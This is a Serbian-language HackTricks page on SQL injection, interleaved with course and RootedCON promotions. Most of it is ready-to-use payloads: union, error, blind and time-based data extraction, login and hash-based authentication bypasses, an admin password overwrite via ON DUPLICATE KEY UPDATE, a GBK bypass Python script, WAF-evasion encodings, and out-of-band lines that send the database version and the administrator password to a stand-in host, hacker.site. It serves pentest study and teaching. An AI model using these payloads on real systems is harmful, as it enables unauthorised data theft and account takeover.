# SQL Injection

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiƒçku bezbednost**? ≈Ωelite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji kibernetiƒçki dogaƒëaj u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je kljuƒçno mesto susreta tehnolo≈°kih i kibernetiƒçkih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## ≈†ta je SQL injection?

**SQL injection** je sigurnosna gre≈°ka koja omoguƒáava napadaƒçima da **ometaju upite baze podataka** aplikacije. Ova ranjivost omoguƒáava napadaƒçima da **pregledaju**, **izmene** ili **obri≈°u** podatke do kojih ne bi trebali da imaju pristup, ukljuƒçujuƒái informacije drugih korisnika ili bilo koje podatke do kojih aplikacija mo≈æe da pristupi. Takve akcije mogu rezultirati trajnim promenama funkcionalnosti ili sadr≈æaja aplikacije, pa ƒçak i kompromitacijom servera ili uskraƒáivanjem usluge.

## Otkrivanje taƒçke ulaza

Kada se sajt ƒçini **ranjivim na SQL injection (SQLi)** zbog neobiƒçnih odgovora servera na SQLi povezane unose, **prvi korak** je razumeti kako **ubaciti podatke u upit bez naru≈°avanja njega**. To zahteva identifikaciju metode za **izlazak iz trenutnog konteksta** na efikasan naƒçin. Ovo su neki korisni primeri:

```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

Zatim, morate znati kako **popraviti upit da ne bude gre≈°aka**. Da biste popravili upit, mo≈æete **uneti** podatke tako da **prethodni upit prihvati nove podatke**, ili jednostavno mo≈æete **uneti** svoje podatke i **dodati simbol komentara na kraju**.

Napomena: Ako mo≈æete videti poruke o gre≈°kama ili primetiti razlike kada upit radi i kada ne radi, ova faza ƒáe biti lak≈°a.

### **Komentari**

```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

### Potvrda pomoƒáu logiƒçkih operacija

Pouzdan naƒçin potvrde ranjivosti SQL ubacivanja ukljuƒçuje izvr≈°avanje **logiƒçke operacije** i posmatranje oƒçekivanih rezultata. Na primer, GET parametar poput `?username=Peter` koji daje isti rezultat kada se izmeni u `?username=Peter' or '1'='1` ukazuje na ranjivost SQL ubacivanja.

Sliƒçno tome, primena **matematiƒçkih operacija** slu≈æi kao efikasna tehnika potvrde. Na primer, ako pristupanje `?id=1` i `?id=2-1` proizvodi isti rezultat, to ukazuje na SQL ubacivanje.

Primeri koji demonstriraju potvrdu logiƒçke operacije:

```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```

Ova lista reƒçi je napravljena kako bi se poku≈°alo **potvrditi SQL ubacivanje** na predlo≈æeni naƒçin:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Potvrƒëivanje pomoƒáu vremena

U nekim sluƒçajevima **neƒáete primetiti nikakvu promenu** na stranici koju testirate. Stoga, dobar naƒçin da **otkrijete slepo SQL ubacivanje** je da naterate bazu podataka da izvr≈°i radnje koje ƒáe **uticati na vreme** potrebno za uƒçitavanje stranice.\
Stoga, dodajemo u SQL upit operaciju koja ƒáe dugo trajati da se izvr≈°i:

```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

U nekim sluƒçajevima **neƒáe biti dozvoljene funkcije za uspavljivanje**. Tada, umesto kori≈°ƒáenja tih funkcija, mo≈æete napraviti upit koji ƒáe **izvr≈°avati slo≈æene operacije** koje ƒáe trajati nekoliko sekundi. _Primeri ovih tehnika ƒáe biti posebno komentarisani za svaku tehnologiju (ako postoje)_.

### Identifikacija Back-end-a

Najbolji naƒçin za identifikaciju back-end-a je poku≈°aj izvr≈°avanja funkcija razliƒçitih back-end-ova. Mo≈æete koristiti _**sleep**_ **funkcije** iz prethodne sekcije ili ove (tabela sa [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):

```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

Takoƒëe, ako imate pristup rezultatima upita, mo≈æete **ispisati verziju baze podataka**.

{% hint style="info" %}
Nastaviƒáemo da razmatramo razliƒçite metode za iskori≈°ƒáavanje razliƒçitih vrsta SQL Injection. Kao primer koristimo MySQL.
{% endhint %}

### Identifikacija pomoƒáu PortSwigger-a

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Iskori≈°ƒáavanje bazirano na Uniji

### Otkrivanje broja kolona

Ako mo≈æete videti rezultate upita, ovo je najbolji naƒçin za iskori≈°ƒáavanje.\
Prvo, moramo saznati **broj** **kolona** koje **poƒçetni zahtev** vraƒáa. To je zato ≈°to **oba upita moraju vratiti isti broj kolona**.\
Za ovo se obiƒçno koriste dve metode:

#### Order/Group by

Da biste odredili broj kolona u upitu, postepeno prilagoƒëavajte broj koji se koristi u klauzulama **ORDER BY** ili **GROUP BY** dok ne dobijete la≈æan odgovor. Bez obzira na razliƒçite funkcionalnosti **GROUP BY** i **ORDER BY** u SQL-u, oba se mogu koristiti na isti naƒçin za odreƒëivanje broja kolona upita.

```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

#### UNION SELECT

Izaberite sve vi≈°e i vi≈°e null vrednosti dok upit ne bude ispravan:

```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

_Treba da koristite `null` vrednosti jer u nekim sluƒçajevima tip kolona sa obe strane upita mora biti isti, a null je validan u svakom sluƒçaju._

### Izdvajanje imena baza podataka, imena tabela i imena kolona

U sledeƒáim primerima ƒáemo izvuƒái ime svih baza podataka, ime tabele iz baze podataka i imena kolona iz tabele:

```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

_Postoji razliƒçit naƒçin za otkrivanje ovih podataka na svakoj razliƒçitoj bazi podataka, ali metodologija je uvek ista._

## Iskori≈°ƒáavanje skrivenog unije baziranog

Kada je izlaz upita vidljiv, ali unije bazirane na ubrizgavanju izgledaju nedosti≈æne, to ukazuje na prisustvo **skrivenog unije baziranog ubrizgavanja**. Ova situacija ƒçesto dovodi do slepog ubrizgavanja. Da biste pretvorili slepo ubrizgavanje u unije bazirano, potrebno je da se sazna izvr≈°avanje upita na pozadini.

To se mo≈æe postiƒái kori≈°ƒáenjem tehnika slepog ubrizgavanja zajedno sa podrazumevanim tabelama specifiƒçnim za ciljni sistem za upravljanje bazom podataka (DBMS). Da biste razumeli ove podrazumevane tabele, savetuje se konsultacija dokumentacije ciljnog DBMS-a.

Nakon ≈°to je upit izvuƒçen, neophodno je prilagoditi svoj payload kako bi se bezbedno zatvorio originalni upit. Zatim se unija upita dodaje va≈°em payloadu, olak≈°avajuƒái iskori≈°ƒáavanje novo dostupnog unije baziranog ubrizgavanja.

Za detaljnije informacije, pogledajte kompletan ƒçlanak dostupan na [Healing Blind Injections](https://medium.com/@Rend\_/healing-blind-injections-df30b9e0e06f).

## Iskori≈°ƒáavanje gre≈°aka bazirano

Ako iz nekog razloga **ne mo≈æete** videti **izlaz** upita, ali mo≈æete **videti poruke o gre≈°kama**, mo≈æete iskoristiti ove poruke o gre≈°kama da **izfiltrirate** podatke iz baze podataka.\
Prateƒái sliƒçan tok kao kod iskori≈°ƒáavanja unije baziranog ubrizgavanja, mo≈æete uspeti da izvuƒçete bazu podataka.

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```

## Iskori≈°ƒáavanje slepe SQLi

U ovom sluƒçaju ne mo≈æete videti rezultate upita ili gre≈°ke, ali mo≈æete **razlikovati** kada upit **vrati** odgovor **taƒçno** ili **netaƒçno** jer se na stranici nalaze razliƒçiti sadr≈æaji.\
U ovom sluƒçaju, mo≈æete zloupotrebiti to pona≈°anje kako biste postepeno izvukli karaktere iz baze podataka:

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

## Iskori≈°ƒáavanje Slepe SQLi Gre≈°ke

Ovo je **isti sluƒçaj kao i prethodni**, ali umesto razlikovanja izmeƒëu taƒçnog/netaƒçnog odgovora iz upita, mo≈æete razlikovati da li postoji **gre≈°ka** u SQL upitu ili ne (mo≈æda zbog pada HTTP servera). Stoga, u ovom sluƒçaju mo≈æete izazvati SQL gre≈°ku svaki put kada taƒçno pogodite karakter:

```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

## Iskori≈°ƒáavanje SQLi bazirano na vremenu

U ovom sluƒçaju **nema** naƒçina da se **razlikuje** odgovor upita na osnovu konteksta stranice. Meƒëutim, mo≈æete uƒçiniti da se stranica **du≈æe uƒçitava** ako je pogodno pretpostavljeno slovo taƒçno. Veƒá smo videli ovu tehniku u upotrebi ranije kako bismo [potvrdili SQLi ranjivost](./#potvrda-pomoƒáu-vremena).

```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

## Stacked Queries

Mo≈æete koristiti "stacked queries" da biste **izvr≈°ili vi≈°e upita jedan za drugim**. Imajte na umu da se dok se izvr≈°avaju sledeƒái upiti, **rezultati ne vraƒáaju aplikaciji**. Stoga je ova tehnika uglavnom korisna u vezi sa **slepim ranjivostima**, gde mo≈æete koristiti drugi upit da pokrene DNS pretragu, uslovnu gre≈°ku ili ka≈°njenje vremena.

**Oracle** ne podr≈æava **stacked queries**. **MySQL, Microsoft** i **PostgreSQL** ih podr≈æavaju: `UPIT-1-OVDE; UPIT-2-OVDE`

## Eksploatacija van mre≈æe

Ako **nijedna druga** metoda eksploatacije **nije uspela**, mo≈æete poku≈°ati da **izvuƒçete informacije iz baze podataka** na **spoljni server** koji je pod va≈°om kontrolom. Na primer, putem DNS upita:

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

### Izvlaƒçenje podataka putem XXE-a izvan opsega

XXE (Eksterni XML Entitet) je sigurnosna ranjivost koja omoguƒáava napadaƒçu da izvr≈°i udaljene zahteve i izvuƒçe podatke izvan opsega aplikacije. Ova tehnika se mo≈æe koristiti za izvlaƒçenje osetljivih informacija iz baze podataka putem XML eksternih entiteta.

Da biste iskoristili ovu ranjivost, prvo morate pronaƒái mesto gde se koristi XML parser koji podr≈æava eksterne entitete. Zatim, mo≈æete konstruisati poseban XML payload koji ƒáe izvr≈°iti udaljeni zahtev i vratiti osetljive podatke.

Na primer, mo≈æete konstruisati payload koji ƒáe izvr≈°iti SQL upit na bazi podataka i vratiti rezultate. Ovi rezultati mogu biti ukljuƒçeni u XML odgovor koji ƒáe biti poslat napadaƒçu.

Da biste izvr≈°ili ovu tehniku, koristite sledeƒáe korake:

1. Pronaƒëite mesto gde se koristi XML parser koji podr≈æava eksterne entitete.
2. Konstrui≈°ite XML payload koji ƒáe izvr≈°iti udaljeni zahtev i vratiti osetljive podatke.
3. Po≈°aljite payload na ciljnu aplikaciju i pratite odgovor kako biste izvukli osetljive podatke.

Va≈æno je napomenuti da je ova tehnika vrlo moƒána i mo≈æe biti zloupotrebljena. Stoga je va≈æno da se koristi samo u okviru zakonitog pentestinga i sa dozvolom vlasnika sistema.

```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```

## Automatizovano iskori≈°ƒáavanje

Proverite [SQLMap Cheetsheat](sqlmap/) da biste iskoristili SQLi ranjivost sa [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Tehniƒçke specifiƒçnosti

Veƒá smo razgovarali o svim naƒçinima iskori≈°ƒáavanja SQL Injection ranjivosti. Pronaƒëite jo≈° neke trikove koji zavise od tehnologije baze podataka u ovoj knjizi:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ili ƒáete pronaƒái **mnogo trikova u vezi sa: MySQL, PostgreSQL, Oracle, MSSQL, SQLite i HQL na** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji kibernetiƒçki dogaƒëaj u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je kljuƒçno mesto susreta tehnolo≈°kih i kibernetiƒçkih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Zaobila≈æenje autentifikacije

Lista za poku≈°aj zaobila≈æenja funkcionalnosti prijave:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Zaobila≈æenje autentifikacije putem sirovog he≈°a

```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

Ova upit pokazuje ranjivost kada se MD5 koristi sa true za sirovi izlaz u proveri autentifikacije, ƒçime se sistem ƒçini podlo≈ænim SQL ubacivanju. Napadaƒçi mogu iskoristiti ovo tako ≈°to ƒáe oblikovati unose koji, kada se he≈°iraju, proizvode neoƒçekivane delove SQL komandi, ≈°to dovodi do neovla≈°ƒáenog pristupa.

```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```

### Bypass autentifikacije putem ubacivanja hash-a

Ova tehnika se koristi za zaobila≈æenje autentifikacije putem ubacivanja hash-a u SQL upit. Kada se koristi lo≈°a implementacija autentifikacije koja ne proverava ispravnost unetih podataka, moguƒáe je iskoristiti SQL Injection da bi se umesto pravog hash-a ubacio la≈æni hash.

Da bi se ova tehnika primenila, potrebno je prvo dobiti pravi hash koji se koristi za autentifikaciju. Zatim se taj hash ubacuje u SQL upit umesto unetog korisniƒçkog imena i lozinke. Na taj naƒçin se zaobilazi provera autentifikacije i omoguƒáava pristup sistemskim resursima.

Ova tehnika je vrlo opasna i mo≈æe dovesti do ozbiljnog kompromitovanja sistema. Zbog toga je va≈æno da se implementira sigurna autentifikacija koja proverava ispravnost unetih podataka i spreƒçava SQL Injection napade.

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

**Preporuƒçena lista**:

Kao korisniƒçko ime trebate koristiti svaku liniju iz liste, a kao lozinku uvijek: _**Pass1234.**_\
_(Ove payloade takoƒëer mo≈æete pronaƒái u velikoj listi spomenutoj na poƒçetku ovog odjeljka)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Bypass autentifikacije

Ako se ' izbjegava, mo≈æete koristiti %A8%27, a kada se ' izbjegne, stvorit ƒáe se: 0xA80x5c0x27 (_‚ïò'_)

```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```

Python skripta:

```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```

### Poliglotna injekcija (vi≈°ekontekstualna)

Polyglot injection, also known as multicontext injection, is a technique used in SQL injection attacks. It involves crafting a malicious payload that can be interpreted as valid code in multiple database management systems (DBMS). This allows the attacker to target different DBMS with a single payload, increasing the chances of a successful attack.

Polyglot injection takes advantage of the syntax and behavior differences between different DBMS. By carefully constructing the payload, the attacker can ensure that it is interpreted correctly by multiple DBMS, regardless of the specific syntax requirements of each system.

This technique is particularly useful when the attacker is unsure about the underlying DBMS used by the target application. By using a polyglot payload, the attacker can increase the likelihood of a successful SQL injection attack, regardless of the specific DBMS in use.

It is important to note that crafting a polyglot injection payload requires a deep understanding of the syntax and behavior of multiple DBMS. Additionally, the payload must be carefully constructed to avoid any syntax conflicts or errors that could prevent successful exploitation.

Overall, polyglot injection is a powerful technique that allows attackers to target multiple DBMS with a single payload, increasing the chances of a successful SQL injection attack.

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Insert Statement

### Promena lozinke postojeƒáeg objekta/korisnika

Da biste to uradili, trebali biste poku≈°ati **kreirati novi objekat sa istim imenom kao "glavni objekat"** (verovatno **admin** u sluƒçaju korisnika) i izmeniti ne≈°to:

* Kreirajte korisnika sa imenom: **AdMIn** (velika i mala slova)
* Kreirajte korisnika sa imenom: **admin=**
* **SQL Truncation napad** (kada postoji neka vrsta **ograniƒçenja du≈æine** za korisniƒçko ime ili email) --> Kreirajte korisnika sa imenom: **admin \[mnogo razmaka] a**

#### SQL Truncation napad

Ako je baza podataka ranjiva i maksimalan broj karaktera za korisniƒçko ime je na primer 30, a ≈æelite da se predstavite kao korisnik **admin**, poku≈°ajte da kreirate korisniƒçko ime nazvano: "_admin \[30 razmaka] a_" i bilo koju lozinku.

Baza podataka ƒáe **proveriti** da li uneto **korisniƒçko ime postoji** u bazi podataka. Ako **ne postoji**, ona ƒáe **skratiti** korisniƒçko ime na **maksimalan dozvoljeni broj karaktera** (u ovom sluƒçaju na: "_admin \[25 razmaka]_") i automatski ƒáe ukloniti sve razmake na kraju, a≈æurirajuƒái unutar baze podataka korisnika "**admin**" sa **novom lozinkom** (mogu se pojaviti neke gre≈°ke, ali to ne znaƒçi da nije uspelo).

Vi≈°e informacija: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Napomena: Ovaj napad vi≈°e neƒáe raditi kao ≈°to je opisano u najnovijim instalacijama MySQL-a. Iako poreƒëenja i dalje ignori≈°u razmake na kraju podrazumevano, poku≈°aj da se unese string koji je du≈æi od du≈æine polja rezultiraƒáe gre≈°kom i neƒáe biti moguƒáe izvr≈°iti unos. Za vi≈°e informacija o ovoj proveri:_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)

### MySQL Insert provera bazirana na vremenu

Dodajte onoliko `','',''` koliko smatrate da je potrebno da izaƒëete iz izjave VALUES. Ako se izvr≈°i ka≈°njenje, imate SQLInjection.

```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```

### ON DUPLICATE KEY UPDATE

Klauzula `ON DUPLICATE KEY UPDATE` u MySQL-u se koristi da se specificiraju akcije koje baza podataka treba preduzeti kada se poku≈°a umetnuti red koji bi rezultirao dupliranom vredno≈°ƒáu u UNIQUE indeksu ili PRIMARY KEY. Sledeƒái primer prikazuje kako se ova funkcionalnost mo≈æe iskoristiti da se izmeni lozinka administratorskog naloga:

Primer Payload Injection:

Payload za ubacivanje mo≈æe biti kreiran na sledeƒái naƒçin, gde se poku≈°ava ubaciti dva reda u tabelu `users`. Prvi red je mamac, a drugi red cilja postojeƒái administratorski email sa namerom da se a≈æurira lozinka:

```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```

Evo kako to funkcioni≈°e:

* Upit poku≈°ava da unese dva reda: jedan za `generic_user@example.com` i drugi za `admin_generic@example.com`.
* Ako red za `admin_generic@example.com` veƒá postoji, klauza `ON DUPLICATE KEY UPDATE` se aktivira, nareƒëujuƒái MySQL-u da a≈æurira polje `password` postojeƒáeg reda na "bcrypt\_hash\_of\_newpassword".
* Kao rezultat toga, autentifikacija se mo≈æe poku≈°ati koristeƒái `admin_generic@example.com` sa lozinkom koja odgovara bcrypt hash-u ("bcrypt\_hash\_of\_newpassword" predstavlja bcrypt hash nove lozinke, koji treba zameniti stvarnim hash-om ≈æeljene lozinke).

### Izvlaƒçenje informacija

#### Kreiranje 2 naloga istovremeno

Prilikom poku≈°aja kreiranja novog korisnika, potrebni su korisniƒçko ime, lozinka i email:

```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```

#### Kori≈°ƒáenje decimalnog ili heksadecimalnog broja

Pomoƒáu ove tehnike mo≈æete izvuƒái informacije kreirajuƒái samo 1 nalog. Va≈æno je napomenuti da ne morate komentarisati ni≈°ta.

Kori≈°ƒáenje **hex2dec** i **substr**:

```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```

Da biste dobili tekst, mo≈æete koristiti:

```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```

Kori≈°ƒáenje **hex** i **replace** (i **substr**):

```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji dogaƒëaj u oblasti kibernetiƒçke bezbednosti u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je vrelo sastajali≈°te za profesionalce iz oblasti tehnologije i kibernetiƒçke bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection je situacija u kojoj ubacivaƒçki upit nije onaj koji daje izlaz, veƒá izlaz ubacivaƒçkog upita ide u upit koji daje izlaz. ([Iz dokumenta](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Primer:

```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

## Bypass WAF

[Poƒçetni zaobiƒëeni odavde](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Zaobiƒëenje bez razmaka

Bez razmaka (%20) - zaobiƒëeno kori≈°ƒáenjem alternativa za razmake

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

## No Whitespace - zaobila≈æenje kori≈°ƒáenjem komentara

### Opis

No Whitespace (bez razmaka) tehnika zaobila≈æenja se koristi kada je unos korisnika filtriran tako da ne dozvoljava upotrebu razmaka. Ova tehnika koristi SQL komentare kako bi se zaobi≈°ao taj filter.

### Napadni vektor

Napadaƒç mo≈æe iskoristiti ovu tehniku kada je unos korisnika ograniƒçen i ne dozvoljava kori≈°ƒáenje razmaka.

### Napadni scenario

Napadaƒç mo≈æe koristiti SQL komentare (`/* */` ili `--`) kako bi zaobi≈°ao ograniƒçenje razmaka i ubacio SQL kod.

Na primer, ako je unos korisnika ograniƒçen i ne dozvoljava razmake, napadaƒç mo≈æe koristiti sledeƒái napadni vektor:

```
'/**/UNION/**/SELECT/**/1,2,3-- -
```

